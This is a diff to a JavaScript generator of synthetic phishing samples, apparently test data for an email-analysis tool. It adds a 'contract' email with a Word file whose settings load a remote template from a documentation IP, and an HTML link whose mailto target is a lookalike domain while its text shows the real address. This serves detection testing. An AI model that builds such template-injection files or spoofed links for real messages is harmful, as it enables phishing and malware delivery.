@@ -293,6 +293,64 @@ ${b64(ratePdf)}
 --rs--
 `;
 
+// 09: an "updated contract" from a partner that passes every check. The Word file has no macro, but its
+// settings point Word at a template on a web server (template injection), and the email address shown for
+// questions is a mailto: link to someone else. Nothing in the file is real: the template URL is a documentation IP.
+const R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+const contractDocx = makeZip([
+  { name: '[Content_Types].xml', data: '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>' },
+  { name: 'word/document.xml', data: '<w:document><!-- mailsleuth synthetic sample: no real content --></w:document>' },
+  { name: 'word/_rels/document.xml.rels', data: `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${R}/settings" Target="settings.xml"/></Relationships>` },
+  { name: 'word/settings.xml', data: '<w:settings><w:attachedTemplate r:id="rId1"/></w:settings>' },
+  { name: 'word/_rels/settings.xml.rels', data: `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${R}/attachedTemplate" Target="http://198.51.100.23/templates/contract.dotm" TargetMode="External"/></Relationships>` },
+]);
+samples['09-contract-remote-template.eml'] = `Return-Path: <morgan.ortiz@brightwell-supply.example>
+Received: from mx1.example.net (mx1.example.net [192.0.2.10])
+ by mailstore.example.net with LMTP id 7A41C3; Fri, 20 Nov 2026 14:02:19 +0000
+Received: from mail.brightwell-supply.example (mail.brightwell-supply.example [198.51.100.88])
+ by mx1.example.net with ESMTPS id 9e1b4c; Fri, 20 Nov 2026 14:02:17 +0000
+Authentication-Results: mx1.example.net;
+ spf=pass smtp.mailfrom=morgan.ortiz@brightwell-supply.example;
+ dkim=pass header.d=brightwell-supply.example;
+ dmarc=pass header.from=brightwell-supply.example
+From: "Morgan Ortiz" <morgan.ortiz@brightwell-supply.example>
+To: "Alex Rivera" <alex@example.net>
+Subject: Updated supply contract for review
+Date: Fri, 20 Nov 2026 14:02:10 +0000
+Message-ID: <synthetic-0009@brightwell-supply.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="ct"
+
+--ct
+Content-Type: multipart/alternative; boundary="alt"
+
+--alt
+Content-Type: text/plain; charset=utf-8
+
+Hi Alex,
+
+Please find the updated supply contract attached for your review.
+If you have questions, reply to morgan.ortiz@brightwell-supply.example.
+
+Best,
+Morgan
+--alt
+Content-Type: text/html; charset=utf-8
+
+<p>Hi Alex,</p>
+<p>Please find the updated supply contract attached for your review.<br>
+If you have questions, write to <a href="mailto:morgan.ortiz.contracts@brightwell-supp1y.example">morgan.ortiz@brightwell-supply.example</a>.</p>
+<p>Best,<br>Morgan</p>
+--alt--
+--ct
+Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document; name="Supply_Contract_2027.docx"
+Content-Disposition: attachment; filename="Supply_Contract_2027.docx"
+Content-Transfer-Encoding: base64
+
+${b64(contractDocx)}
+--ct--
+`;
+
 for (const [name, body] of Object.entries(samples)) writeFileSync(new URL(`../samples/${name}`, import.meta.url), body);
 console.log(`wrote ${Object.keys(samples).length} samples`);
 
